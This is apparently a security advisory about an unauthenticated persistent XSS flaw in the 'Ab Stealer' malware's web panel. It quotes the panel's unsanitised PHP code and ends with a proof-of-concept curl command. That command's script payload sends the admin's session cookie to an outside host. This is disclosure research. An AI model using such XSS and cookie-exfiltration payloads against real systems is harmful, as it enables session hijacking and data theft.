Threat: Ab Stealer Web Panel
Vulnerability: Unauthenticated Remote Persistent XSS
Description: The "Ab Stealer" web Panel By KingDomSc for "AbBuild
v.1.0.exe" is used to browse victim information "Get All Victims Passwords,
With One Click". Third-party attackers who can reach the "Ab Stealer"
server can write plaintext files to Panel\psw, injecting persistent Cross
Site Scripting payloads without the need for authentication. The XSS
payloads will execute whenever an "Ab Stealer" admin visits the Web UI or
clicks an infected link to view victim information. The sending of HTTP
POST requests to POST.php write files "ip-1.txt, ip-2.txt" etc to the "psw"
dir. These textfiles typically contain victim information IP, Computername,
Country, Date. However, since the PHP code has no security we can inject
malicious client side Javascript instead. This can result in data theft and
disclosure of the PHPSESSID token or GEO location disclosure for a logged
on user of the "Ab Stealer" Web Panel etc.

Ab Stealers POST.php file doesn't sanitize input for HTTP GET requests,
when writing user supplied data to files to it's "psw" web directory.

E.g.

if (isset($_GET['online'])) {
    $path    = 'psw';
    $files = array_diff(scandir($path), array('.', '..'));
    $CountFiles = count($files) + 1;
    $FileName = 'ip-'.$CountFiles.'.txt';
    $ip = $_POST['ip'];
    $computername = $_POST['computername'];
    $installdate = $_POST['installdate'];
    $country = $_POST['country'];
    $FFD =
'{"ip":"'.$ip.'","computername":"'.$computername.'","country":"'.$country.'","date":"'.$installdate.'"}';
    $myfile = fopen('psw/'.$FileName, "w") or die("Unable to open file!");
    fwrite($myfile, $FFD);
    fclose($myfile);
    echo $CountFiles;
}

Moreover, Panel.php doesn't use htmlspecialchars OR htmlentities, to
properly escape output when echoing untrusted user supplied data.

Exploit/PoC:
1) Create the psw directory as the Panel setup doesn't create it when
installing

2) curl.exe http://AB_STEALER_SERVER/Panel/POST.php?online=1 --data
"ip=x.x.x.x&computername='%3Cscript%3Ewindow.open('
http://malvuln.com/stealsess.php?tok='%2bdocument.cookie)%3C/script%3E&installdate=&country=HELL
"

3) Visit Ab Stealer Web UI and or click an infected link.
